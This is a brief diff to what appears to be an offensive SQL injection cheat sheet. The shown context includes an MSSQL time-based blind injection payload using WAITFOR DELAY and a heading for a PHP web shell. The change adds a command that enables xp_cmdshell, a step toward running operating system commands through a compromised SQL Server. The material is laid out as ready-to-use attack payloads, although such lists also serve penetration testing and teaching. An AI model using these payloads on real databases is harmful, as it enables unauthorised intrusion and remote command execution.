@@ -352,6 +352,10 @@ MSSQL
 ```
 IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFOR DELAY '0:0:5'-- --
 ```
+Enable xp_cmdshell
+```
+SP_CONFIGURE "xp_cmdshell", 1
+```
 
 ### PHP Web Shell
 ```
